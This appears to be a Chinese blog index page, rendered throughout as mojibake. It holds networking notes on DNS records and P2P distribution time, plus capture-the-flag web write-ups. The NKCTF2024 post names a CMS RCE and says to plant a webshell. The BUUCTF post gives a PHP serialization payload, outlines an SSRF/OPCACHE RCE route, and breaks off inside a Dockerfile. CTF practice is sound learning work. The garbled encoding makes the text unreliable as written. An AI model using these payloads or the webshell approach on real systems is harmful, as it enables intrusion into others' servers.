<p>è¿™æ˜¯ä¸æ˜¯å°±ç›¸å½“äºä¹‹å‰å­¦çš„é€’å½’å‘¢ï¼Œä¾‹å¦‚æ–æ³¢é‚£å¥‘é¢æ•°åˆ—ï¼Œè°ƒç”¨å‡½æ•°æœ¬èº«ï¼Œæœ€ç»ˆçš„ç»“æœæ˜¯å‡½æ•°æœ¬èº«è¿”å›çš„å€¼ã€‚</p>
<p>:::</p>
<h5 id="DNSç¼“å­˜"><a href="#DNSç¼“å­˜" class="headerlink" title="DNSç¼“å­˜"></a>DNSç¼“å­˜</h5><p>ç›¸å½“äºåœ¨æœ¬åœ°DNSæœåŠ¡å™¨æ·»åŠ äº†ä¸€ä¸ªDNSç¼“å­˜å™¨ï¼Œç”¨äºå­˜å‚¨æ¯ä¸€ä¸ªæ¥æ”¶åˆ°çš„å›ç­”ï¼Œå¯ä»¥ç»•è¿‡æ ¹æœåŠ¡å™¨ï¼Œä¾¿äºè¯·æ±‚ä¸»æœºåœ¨è¯·æ±‚ç›¸åŒçš„åœ°å€æ—¶å¯ä»¥ç›´æ¥è¿”å›è¯¥IPåœ°å€ï¼ŒèŠ‚çœäº†æ—¶é—´ï¼Œä¹ŸèŠ‚çœäº†èµ„æºã€‚</p>
<h3 id="DNSè®°å½•å’ŒæŠ¥æ–‡"><a href="#DNSè®°å½•å’ŒæŠ¥æ–‡" class="headerlink" title="DNSè®°å½•å’ŒæŠ¥æ–‡"></a>DNSè®°å½•å’ŒæŠ¥æ–‡</h3><h4 id="èµ„æºè®°å½•ï¼ˆResource-Recordï¼ŒRRï¼‰"><a href="#èµ„æºè®°å½•ï¼ˆResource-Recordï¼ŒRRï¼‰" class="headerlink" title="èµ„æºè®°å½•ï¼ˆResource Recordï¼ŒRRï¼‰"></a>èµ„æºè®°å½•ï¼ˆResource Recordï¼ŒRRï¼‰</h4><p>èµ„æºè®°å½•æä¾›äº†ä¸»æœºååˆ°IPåœ°å€çš„æ˜ å°„ã€‚æ¯ä¸€ä¸ªDNSå›ç­”æŠ¥æ–‡åŒ…å«äº†ä¸€æ¡æˆ–å¤šæ¡èµ„æºè®°å½•ã€‚</p>
<p>èµ„æºè®°å½•åŒ…å«äº†ä»¥ä¸‹å››å…ƒç»„ï¼š==ï¼ˆNameï¼ŒValueï¼ŒTypeï¼ŒTTLï¼‰==</p>
<p>TTLæ˜¯è®°å½•çš„ç”Ÿå­˜æ—¶é—´ï¼Œå®ƒå†³å®šäº†èµ„æºè®°å½•åº”å½“ä»ç¼“å­˜ä¸­åˆ é™¤çš„æ—¶é—´ã€‚Nameå’ŒValueå–å†³äºTypeï¼š</p>
<ol>
<li>Type=Aï¼Œåˆ™Nameå°±æ˜¯ä¸»æœºåï¼ŒValueå°±æ˜¯ä¸»æœºåå¯¹åº”çš„IPåœ°å€ï¼›</li>
<li>Type=NSï¼Œåˆ™Nameå°±æ˜¯åŸŸåï¼ˆå¦‚<code>example.com</code>ï¼‰ï¼ŒValueå°±æ˜¯æƒå¨DNSæœåŠ¡å™¨çš„ä¸»æœºåï¼ˆå¦‚<code>dns.example.com</code>ï¼‰ï¼›</li>
<li>Type=CNAMEï¼Œåˆ™Nameå°±æ˜¯åŸŸåï¼ŒValueæ˜¯ä¸ä¹‹å¯¹åº”çš„è§„èŒƒä¸»æœºåï¼›</li>
<li>Type=MXï¼Œåˆ™Nameå°±æ˜¯åŸŸåï¼ŒValueæ˜¯ä¸ä¹‹å¯¹åº”çš„é‚®ä»¶æœåŠ¡å™¨çš„è§„èŒƒä¸»æœºå</li>
</ol>
<h4 id="DNSæŠ¥æ–‡"><a href="#DNSæŠ¥æ–‡" class="headerlink" title="DNSæŠ¥æ–‡"></a>DNSæŠ¥æ–‡</h4><p>ä»¥ä¸‹æ˜¯DNSæŠ¥æ–‡æ ¼å¼ï¼š</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240409163119252.png" class="" title="image-20240409163119252">

<p>å…ˆè¯´è¯´å‰12ä¸ªå­—èŠ‚é¦–éƒ¨åŒºåŸŸï¼š</p>
<ol>
<li>æ ‡è¯†ç¬¦æ˜¯16æ¯”ç‰¹çš„æ•°ï¼Œç”¨äºæ ‡è¯†è¯¥æŸ¥è¯¢ã€‚è¯¥æ ‡è¯†ç¬¦ä¼šè¢«å¤åˆ¶åˆ°å¯¹åº”çš„å›ç­”æŠ¥æ–‡ä¸­ï¼Œä»¥ä¾¿åŒ¹é…å‘é€çš„è¯·æ±‚å’Œæ”¶åˆ°çš„å›ç­”ï¼›</li>
<li>æ ‡å¿—å­—æ®µæœ‰è‹¥å¹²ä¸ªæ ‡å¿—ï¼Œ1æ¯”ç‰¹çš„â€æŸ¥è¯¢/å›ç­”â€œæ ‡å¿—ä½æŒ‡å‡ºæŠ¥æ–‡æ˜¯æŸ¥è¯¢ï¼ˆ0ï¼‰è¿˜æ˜¯å›ç­”ï¼ˆ1ï¼‰ï¼›å½“è¯·æ±‚çš„æ˜¯æƒå¨DNSæœåŠ¡å™¨æ—¶ï¼Œ1æ¯”ç‰¹çš„â€æƒå¨â€œæ ‡å¿—ä½ä¼šç½®äºå›ç­”æŠ¥æ–‡ä¸­ï¼›</li>
<li>å¦‚æœå®¢æˆ·åœ¨DNSæœåŠ¡å™¨æ²¡æœ‰æŸè®°å½•æ—¶æƒ³è¦é€’å½’æŸ¥è¯¢ï¼Œé‚£ä¹ˆæŠ¥æ–‡å°±ä¼šè®¾ç½®1æ¯”ç‰¹çš„â€œå¸Œæœ›æ ‡å¿—â€ä½ï¼›</li>
<li>å¦‚æœDNSæœåŠ¡å™¨æ”¯æŒé€’å½’æŸ¥è¯¢ï¼Œé‚£ä¹ˆå›ç­”æŠ¥æ–‡ä¸­æŠŠ1æ¯”ç‰¹çš„â€œé€’å½’å¯ç”¨â€æ ‡å¿—ä½è¿›è¡Œç½®ä½ï¼›</li>
<li>å¦å¤–å››ä¸ªæœ‰å…³æ•°é‡çš„å­—æ®µï¼Œåˆ™æŒ‡å‡ºäº†åœ¨é¦–éƒ¨åçš„4ç±»æ•°æ®åŒºåŸŸå‡ºç°çš„æ•°é‡</li>
</ol>
<p>å†è¯´è¯´åé¢çš„æ•°æ®åŒºåŸŸï¼š</p>
<ol>
<li><strong>é—®é¢˜åŒºåŸŸ</strong>åŒ…å«æ­£åœ¨è¿›è¡Œçš„æŸ¥è¯¢ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼šï¼ˆ1ï¼‰åå­—å­—æ®µï¼ŒåŒ…å«æ­£åœ¨è¢«æŸ¥è¯¢çš„ä¸»æœºåï¼›ï¼ˆ2ï¼‰ç±»å‹å­—æ®µï¼ŒæŒ‡å‡ºæœ‰å…³è¯¥åå­—çš„æ­£è¢«è¯¢é—®çš„é—®é¢˜ç±»å‹ï¼Œä¾‹å¦‚æ˜¯å¦ä¸ä¸€ä¸ªåå­—ï¼ˆAï¼‰æˆ–ä¸€ä¸ªåå­—çš„é‚®ä»¶æœåŠ¡å™¨ï¼ˆMXï¼‰ç›¸å…³è”ï¼›</li>
<li><strong>å›ç­”åŒºåŸŸ</strong>åŒ…å«äº†å¯¹æœ€åˆè¯·æ±‚çš„åå­—çš„èµ„æºè®°å½•ï¼ˆä¸Šé¢å·²ç»è¯´è¿‡ï¼Œä¸è®°å¾—çš„å¯ä»¥å»ç¿»ç¿»çœ‹ï¼‰ã€‚åœ¨å›ç­”æŠ¥æ–‡ä¸­çš„å›ç­”åŒºåŸŸä¸­å¯ä»¥åŒ…å«å¤šæ¡RRï¼Œå› æ­¤ä¸€ä¸ªä¸»æœºåèƒ½å¤Ÿæœ‰å¤šä¸ªIPåœ°å€ï¼›</li>
<li><strong>æƒå¨åŒºåŸŸ</strong>åŒ…å«äº†å…¶ä»–æƒå¨æœåŠ¡å™¨çš„è®°å½•ï¼›</li>
<li><strong>é™„åŠ åŒºåŸŸ</strong>åŒ…å«äº†å…¶ä»–æœ‰å¸®åŠ©çš„è®°å½•ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªMXè¯·æ±‚çš„å›ç­”æŠ¥æ–‡çš„å›ç­”åŒºåŸŸåŒ…å«äº†ä¸€æ¡èµ„æºè®°å½•ï¼Œè¯¥è®°å½•æä¾›äº†é‚®ä»¶æœåŠ¡å™¨çš„è§„èŒƒä¸»æœºåã€‚è¯¥é™„åŠ åŒºåŸŸåŒ…å«ä¸€ä¸ªç±»å‹Aè®°å½•ï¼Œè¯¥è®°å½•æä¾›äº†ç”¨äºè¯¥é‚®ä»¶æœåŠ¡å™¨çš„è§„èŒƒä¸»æœºåçš„IPåœ°å€ã€‚</li>
</ol>
<p>:::info no-icon</p>
<p><strong>nslookupç¨‹åº</strong>èƒ½å¤Ÿåšåˆ°è®©æ­£åœ¨å·¥ä½œçš„ä¸»æœºç›´æ¥å‘æŸäº›DNSæœåŠ¡å™¨å‘é€ä¸€ä¸ªDNSæŸ¥è¯¢æŠ¥æ–‡ã€‚</p>
<p>:::</p>
<h2 id="P2Pæ–‡ä»¶åˆ†å‘"><a href="#P2Pæ–‡ä»¶åˆ†å‘" class="headerlink" title="P2Pæ–‡ä»¶åˆ†å‘"></a>P2Pæ–‡ä»¶åˆ†å‘</h2><p>æ ¹æ®ä¹¦ä¸Šä¾‹å­ï¼Œå‡è®¾æœåŠ¡å™¨è¦å°†ä¸€ä¸ªæ–‡ä»¶åˆ†å‘ç»™ä¸€ä¸ªå›ºå®šçš„å¯¹ç­‰æ–¹é›†åˆï¼Œå…¶ä¸­æœåŠ¡å™¨ä¸å¯¹ç­‰æ–¹ä½¿ç”¨æ¥å…¥é“¾è·¯ä¸å› ç‰¹ç½‘ç›¸è¿ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤º</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240410151402082.png" class="" title="image-20240410151402082">

<p>è®¾u<sub>s</sub>ä¸ºæœåŠ¡å™¨æ¥å…¥é“¾è·¯çš„ä¸Šä¼ é€Ÿç‡ï¼Œu<sub>i</sub>è¡¨ç¤ºç¬¬iä¸ªå¯¹ç­‰æ–¹æ¥å…¥é“¾è·¯çš„ä¸Šä¼ é€Ÿç‡ï¼Œd<sub>i</sub>è¡¨ç¤ºç¬¬iä¸ªå¯¹ç­‰æ–¹æ¥å…¥é“¾è·¯çš„ä¸‹è½½é€Ÿç‡ï¼ŒFè¡¨ç¤ºè¢«åˆ†å‘çš„æ–‡ä»¶é•¿åº¦ï¼ˆå•ä½ä¸€èˆ¬ä¸ºbitï¼‰ï¼ŒNè¡¨ç¤ºå¯¹ç­‰æ–¹çš„æ•°é‡ï¼ŒD<sub>cs</sub>æ˜¯å®¢æˆ·-æœåŠ¡å™¨ä½“ç³»ç»“æ„çš„åˆ†å‘æ—¶é—´ã€‚</p>
<p><strong>åˆ†å‘æ—¶é—´ï¼ˆdistribution timeï¼‰</strong>æ˜¯æ‰€æœ‰Nä¸ªå¯¹ç­‰æ–¹å¾—åˆ°è¯¥æ–‡ä»¶çš„å‰¯æœ¬æ‰€éœ€çš„æ—¶é—´ã€‚</p>
<p>ä¸ºäº†æ’é™¤å½±å“ï¼Œè¿™é‡Œçš„ç¯å¢ƒå‡è®¾ä¸ºï¼šå› ç‰¹ç½‘æ ¸å¿ƒæœ‰è¶³å¤Ÿçš„å¸¦å®½ï¼ˆæ‰€ä»¥é€Ÿç‡çš„ç“¶é¢ˆéƒ½åœ¨æ¥å…¥é“¾è·¯ï¼‰ï¼ŒæœåŠ¡å™¨ä¸å®¢æˆ·æ²¡æœ‰å‚ä¸ä»»ä½•å…¶ä»–ç½‘ç»œåº”ç”¨ï¼ˆä¸Šä¼ ä¸ä¸‹è½½çš„å¸¦å®½èƒ½å¤Ÿå…¨éƒ¨ç”¨æ¥å‘æ”¾è¯¥æ–‡ä»¶ï¼‰</p>
<p>åˆ—å‡ºæ‰€æ±‚ï¼š</p>
<ol>
<li>ç”±äºæœåŠ¡å™¨è¦ä¼ æ–‡ä»¶ç»™Nä¸ªå¯¹ç­‰æ–¹ï¼Œå› æ­¤ä¸Šä¼ æ–‡ä»¶çš„æ€»é‡æ˜¯NF bitsï¼Œä¸Šä¼ æ–‡ä»¶èŠ±è´¹çš„æ€»æ—¶é—´ä¸ºNF / u<sub>s</sub>ï¼›</li>
<li>ä»¤d<sub>min</sub>è¡¨ç¤ºæ‰€æœ‰å¯¹ç­‰æ–¹ä¸­æœ€å°çš„ä¸‹è½½é€Ÿç‡ï¼Œå› æ­¤d<sub>min</sub> = min{d<sub>1</sub>,d<sub>2</sub>,d<sub>3</sub>,â€¦â€¦,d<sub>N</sub>}ï¼Œè¿™å°±å¯¼è‡´æœ‰æœ€å°é€Ÿç‡çš„å¯¹ç­‰æ–¹ä¸èƒ½åœ¨F / d<sub>min</sub>å†…è·å–ä¸€ä¸ªå®Œæ•´çš„æ–‡ä»¶ï¼Œå› æ­¤åˆ†å‘æ—¶é—´è‡³å°‘ä¸ºF / d<sub>min</sub>ï¼›</li>
</ol>
<p>å› æ­¤å¯ä»¥å¾—åˆ°ï¼š</p>
<p>â€‹                                                                                    ==D<sub>cs</sub> &gt;= max{NF / u<sub>s</sub>,F / d<sub>min</sub>}ï¼›==</p>
<p>ä¸éš¾çœ‹å‡ºï¼Œå½“Nè¶³å¤Ÿå¤§æ—¶ï¼Œå®¢æˆ·-æœåŠ¡å™¨åˆ†å‘æ—¶é—´å°±æ˜¯ç”±NF / u<sub>s</sub>æ¥å†³å®šçš„ã€‚</p>
<p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹P2Pä½“ç³»ç»“æ„ï¼Œæ¡ä»¶ä¸å˜ï¼Œåˆ—å‡ºæ‰€æ±‚ï¼š</p>
<ol>
<li>å¼€å§‹åˆ†å‘æ—¶ï¼Œç”±äºåªæœ‰æœåŠ¡å™¨æœ‰æ–‡ä»¶ï¼Œå› æ­¤æœåŠ¡å™¨è‡³å°‘è¦ä¸Šä¼ è¯¥æ–‡ä»¶1æ¬¡ï¼Œå› æ­¤åˆ†å‘æ—¶é—´è‡³å°‘ä¸ºF / u<sub>s</sub>ï¼ˆä¸å‰è€…æœ‰å·®åˆ«çš„æ˜¯ï¼ŒæœåŠ¡å™¨åœ¨åˆ†å‘ä¸€æ¬¡æ–‡ä»¶åå¯ä»¥é€‰æ‹©ä¸ç”¨å‘é€ï¼Œå› ä¸ºè¯¥ä½“ç³»ç»“æ„ä¸‹å¯ä»¥é€šè¿‡å…¶ä»–å¯¹ç­‰æ–¹æ¥åˆ†å‘è¯¥æ–‡ä»¶ï¼›</li>
<li>è·Ÿå‰è€…ä¸€æ ·çš„æ˜¯ï¼Œæœ‰æœ€å°é€Ÿç‡çš„å¯¹ç­‰æ–¹ä¸èƒ½åœ¨F / d<sub>min</sub>å†…è·å–ä¸€ä¸ªå®Œæ•´çš„æ–‡ä»¶ï¼Œå› æ­¤åˆ†å‘æ—¶é—´è‡³å°‘ä¸ºF / d<sub>min</sub>ï¼›</li>
<li>åœ¨è¯¥ä½“ç³»ç»“æ„ä¸‹ï¼Œç³»ç»Ÿæ•´ä½“çš„æ€»ä¸Šä¼ èƒ½åŠ›ç­‰äºæœåŠ¡å™¨çš„ä¸Šä¼ é€Ÿç‡åŠ æ¯ä¸ªå¯¹ç­‰æ–¹çš„ä¸Šä¼ é€Ÿç‡ï¼Œå³u<sub>total</sub> = u<sub>1</sub> + u<sub>2</sub> + â€¦ + u<sub>N</sub>;</li>
</ol>
<p>ç»¼ä¸Šï¼Œè®¾D<sub>P2P</sub>ä¸ºP2Pä½“ç³»ç»“æ„ä¸‹çš„æœ€å°åˆ†å‘æ—¶é—´ï¼Œå¾—åˆ°</p>
<p>â€‹                                                                                ==D<sub>P2P</sub> = max{F / u<sub>s</sub>,F / d<sub>min</sub>,NF / (u<sub>s</sub> + u<sub>total</sub>)}==</p>
<p>ä¸‹å›¾æ˜¯ä¸¤ä¸ªç»“æ„çš„åˆ†å‘æ—¶é—´çš„å˜åŒ–è¶‹åŠ¿</p>
<img src="/2024/03/26/ComputerInternet/Computer-Internet2/image-20240410154325767.png" class="" title="image-20240410154325767">
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey">Â </i><a class="article-more button is-small link-muted index-categories" href="/categories/%E8%AE%A1%E7%BD%91/">è®¡ç½‘</a></div>Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2024-03-26Â Â <a class="commentCountImg" href="/2024/03/26/competition/202403/NKCTF2024/#comment-container"><span class="display-none-class">6a07734b0d947a7fb8fdc1d60d90300b</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="6a07734b0d947a7fb8fdc1d60d90300b">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>2 åˆ†é’Ÿ Â <i class="fas fa-pencil-alt">Â </i>0.3Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/03/26/competition/202403/NKCTF2024/">NKCTF2024</a></h1><div class="content"><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="My-first-cms"><a href="#My-first-cms" class="headerlink" title="My first cms"></a>My first cms</h2><p>è¿™é¢˜æˆ‘è¦èƒŒé”…ï¼Œå› ä¸ºæˆ‘é¡ºç€ç‰ˆæœ¬å·æ‰¾CVEç»“æœæ‰¾å‡ºæ¥æ˜¯ä¸ªé”™å®¶ä¼™ã€‚æˆ‘æ‰¾çš„æ˜¯CVE-2024-27625ï¼Œä½†æ˜¯é¢˜ç›®å‡ºçš„æ˜¯CVE-2024-27622â€¦â€¦.:fearful:</p>
<p>ä¸è¿‡åœ¨åšçš„æ—¶å€™ä¹Ÿæ˜¯ç¦»è°±ï¼Œæˆ‘å¼€å§‹çŒœæµ‹å¼±å¯†ç çˆ†ç ´æ˜¯å¯¹çš„ï¼Œç»“æœè¢«è‡ªå·±æ‰¾çš„å¼±å¯†ç ç»™å‘äº†â€¦â€¦:cold_sweat:</p>
<p>CVE-2024-27625æ˜¯XSSæ”»å‡»ï¼ŒCVE-2024-27622æ˜¯è¿œç¨‹RCEã€‚</p>
<p>ä»ä¸€äº›æ¼æ´æƒ…æŠ¥çš„ç½‘ç«™ä¸Šçœ‹åå¾—çŸ¥ï¼Œå‰è€…æ˜¯å› ä¸ºå¼€å‘è€…æ²¡æœ‰æ³¨æ„æˆ–è€…æ¸…ç†ç”¨æˆ·æ–°å»ºç›®å½•ï¼ˆä¸è¿‡æ›´å¤šæ˜¯æ„Ÿè§‰æ²¡æœ‰åšä¸¥æ ¼è¿‡æ»¤ï¼‰ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡æ–°å»ºç›®å½•çš„å­—æ®µæ¤å…¥æ¶æ„ä»£ç ï¼Œä»è€Œå¼•å‘æŒç»­æ€§çš„XSSæ”»å‡»ï¼›åè€…ä¹Ÿæ˜¯å› ä¸ºæ²¡æœ‰æ³¨æ„æˆ–è€…æ¸…ç†ç”¨æˆ·çš„è¾“å…¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡è·å–ç®¡ç†å‘˜æƒé™æ¥è¿›è¡Œphpä»£ç çš„ç¼–å†™ä¸æ‰§è¡Œã€‚</p>
<p>åæ­£ï¼Œè¿™é“é¢˜ç‰¹åˆ«ç®€å•ã€‚æ‰¾ä¸ªè¾“å…¥çš„åœ°æ–¹ç„¶åå†™:horse:å³å¯</p>
</div><div class="index-category-tag"><div class="level-item"><i class="fas fa-folder-open has-text-grey">Â </i><a class="article-more button is-small link-muted index-categories" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a></div>Â Â <hr></div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus">Â </i>2024-03-20Â Â <a class="commentCountImg" href="/2024/03/20/buuctf/buu/#comment-container"><span class="display-none-class">c327572b64f79653a6b954337f4cade6</span><i class="far fa-comment-dots"></i>Â <span class="commentCount" id="c327572b64f79653a6b954337f4cade6">99+</span>Â Â </a><span class="level-item"><i class="far fa-clock">Â </i>1 å°æ—¶ Â <i class="fas fa-pencil-alt">Â </i>6.7Â k</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/03/20/buuctf/buu/">buuåšé¢˜è®°å½•ï¼ˆ1ï¼‰</a></h1><div class="content"><p>:::warning no-icon</p>
<p>åšé¢˜è®°å½•å¦‚ä¸‹</p>
<p><a href="https://luffys93.github.io/buuctf/buu/">buu1</a> -&gt; <a href="https://luffys93.github.io/buuctf/buu2/">buu2</a></p>
<p>:::</p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="DASCTF-X-0psu3åä¸€æœˆæŒ‘æˆ˜èµ›ï½œè¶Šè‰°å·¨Â·è¶Šç‹‚çƒ­-single-php"><a href="#DASCTF-X-0psu3åä¸€æœˆæŒ‘æˆ˜èµ›ï½œè¶Šè‰°å·¨Â·è¶Šç‹‚çƒ­-single-php" class="headerlink" title="[DASCTF X 0psu3åä¸€æœˆæŒ‘æˆ˜èµ›ï½œè¶Šè‰°å·¨Â·è¶Šç‹‚çƒ­]single_php"></a>[DASCTF X 0psu3åä¸€æœˆæŒ‘æˆ˜èµ›ï½œè¶Šè‰°å·¨Â·è¶Šç‹‚çƒ­]single_php</h2><p>æ ¹æ®æç¤ºï¼Œå¯ä»¥ä¼ <code>LuckyE</code>å˜é‡ï¼Œå®ƒçš„å€¼å¯ä»¥è¯•è¯•<code>show_source</code></p>
<img src="/2024/03/20/buuctf/buu/image-20240320152718124.png" class="" title="image-20240320152718124">

<p>çœ‹ä¼¼æ˜¯ååºåˆ—åŒ–ï¼Œä½†å’±æ— æ³•getshellï¼Œå› ä¸ºå°±ç®—èƒ½å¤ŸæˆåŠŸä¹Ÿåªæ˜¯æ‰§è¡Œå‡½æ•°</p>
<p>æ ¹æ®æç¤ºï¼Œè¿›å…¥siranai.php</p>
<p>å‘ç°æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ </p>
<img src="/2024/03/20/buuctf/buu/image-20240320153921982.png" class="" title="image-20240320153921982">

<p>ç”±äºæœ‰å¯¹<code>$_SERVER[&#39;REMOTE_ADDR&#39;]</code>çš„æ£€æµ‹ï¼Œæ‰€ä»¥ç›´æ¥æŠ“åŒ…ä¼ªé€ ç»•è¿‡ä¸å¤ªç°å®ï¼Œåªèƒ½è€ƒè™‘SSRF</p>
<p>åˆ†æåé¢ä»£ç ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ å‹ç¼©åŒ…å¹¶ä¸”å¯ä»¥è§£å‹ï¼Œä½†æ˜¯å®ƒæ˜¯æ”¾ç½®åœ¨tmpç›®å½•ä¸‹çš„ä¸´æ—¶æ–‡ä»¶ï¼Œå› æ­¤æ–‡ä»¶åæ³¨å…¥å‘½ä»¤è¡Œä¸é€š</p>
<p>å¯ä»¥è€ƒè™‘OPCACHEç¼“å­˜æ–‡ä»¶æ¥è¿›è¡ŒRCEï¼ˆæˆ‘å¹¶ä¸ä¼šï¼Œå› ä¸ºå¬éƒ½æ²¡å¬è¿‡:sob:ï¼‰</p>
<h3 id="å•¥æ˜¯OPCACHEå‘¢-confused"><a href="#å•¥æ˜¯OPCACHEå‘¢-confused" class="headerlink" title="å•¥æ˜¯OPCACHEå‘¢:confused:"></a>å•¥æ˜¯OPCACHEå‘¢:confused:</h3><p>å®ƒæ˜¯ä¸€ä¸ªPHPæ‰©å±•ï¼Œé€šè¿‡ä¿å­˜é¢„ç¼–è¯‘çš„è„šæœ¬å­—èŠ‚ç åˆ°å…±äº«å†…å­˜ä¸­æ¥æé«˜PHPçš„æ‰§è¡Œæ•ˆç‡ï¼Œå‡å°‘äº†æ¯æ¬¡åŠ è½½å’Œç¼–è¯‘PHPè„šæœ¬çš„å¼€é”€</p>
<p>å…ˆè¿›å…¥åˆ°<code>phpinfo()</code>çœ‹çœ‹<code>opcache_file_cache_only</code>æœ‰æ²¡æœ‰å¼€</p>
<p>ååºåˆ—åŒ–è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">siroha</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$koi</span> = <span class="keyword">array</span>(<span class="string">&quot;zhanjiangdiyishenqing&quot;</span>=&gt;<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">siroha</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç»“æœä¸º<code>O:6:&quot;siroha&quot;:1:&#123;s:3:&quot;koi&quot;;a:1:&#123;s:21:&quot;zhanjiangdiyishenqing&quot;;s:7:&quot;phpinfo&quot;;&#125;&#125;</code></p>
<img src="/2024/03/20/buuctf/buu/image-20240320160403596.png" class="" title="image-20240320160403596">

<p>ç›¸å…³è®¾ç½®æ˜¯å¼€ç€çš„ï¼Œå¯ä»¥ç›´æ¥ä¸Šæ‰‹</p>
<h3 id="å¦‚ä½•æ‹‰ä¸€ä¸ªé…ç½®å¤§è‡´ç›¸åŒçš„é•œåƒ"><a href="#å¦‚ä½•æ‹‰ä¸€ä¸ªé…ç½®å¤§è‡´ç›¸åŒçš„é•œåƒ" class="headerlink" title="å¦‚ä½•æ‹‰ä¸€ä¸ªé…ç½®å¤§è‡´ç›¸åŒçš„é•œåƒ"></a>å¦‚ä½•æ‹‰ä¸€ä¸ªé…ç½®å¤§è‡´ç›¸åŒçš„é•œåƒ</h3><p>è¿™é‡Œæˆ‘ä»¬æ’å…¥ä¸€æ®µå°æ’æ›²ï¼Œå› ä¸ºè¿™é‡Œå¯¹åé¢çš„è§£é¢˜å¾ˆé‡è¦</p>
<p>å®˜æ–¹çš„é•œåƒ<a target="_blank" rel="noopener" href="https://github.com/docker-library/docs/blob/master/php/README.md#supported-tags-and-respective-dockerfile-links">åœ¨è¿™é‡Œ</a>ï¼Œæ‰¾åˆ°8.2.10å°±è¡Œï¼ˆå¦‚æœæ‰¾ä¸åˆ°å¯ä»¥é—®é—®gpt8.2.10é•œåƒçš„åå­—æ˜¯å•¥ï¼Œä¸è¿‡ä¸€èˆ¬éƒ½æ˜¯php:ç‰ˆæœ¬å·-cliï¼‰</p>
<p>dockerfileå¦‚ä¸‹ï¼š</p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> php:<span class="number">8.2</span>.<span class="number">10</span>-cli</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£… Opcache æ‰©å±•</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> docker-php-ext-install opcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># é…ç½® Opcache</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> &#123; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&#x27;opcache.memory_consumption=128&#x27;</span>; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&#x27;opcache.interned_strings_buffer=8&#x27;</span>; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&#x27;opcache.max_accelerated_files=4000&#x27;</span>; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&#x27;opcache.revalidate_freq=2&#x27;</span>; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&#x27;opcache.fast_shutdown=1&#x27;</span>; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">echo</span> <span class="string">&#x27;opcache.enable_cli=1&#x27;</span>; \</span></span><br><span class="line"><span class="language-bash">&#125; &gt; /usr/local/etc/php/conf.d/opcache-recommended.ini</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»º Opcache ç¼“å­˜ç›®å½•</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mkdir</span> -p /var/www/cache/opcache &amp;&amp; <span class="built_in">chown</span> -R www-data:www-data /var/www/cache/opcache</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œè¿™æ ·å°±å¯ä»¥ä¸ç”¨ä¿®æ”¹php.iniäº†</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> 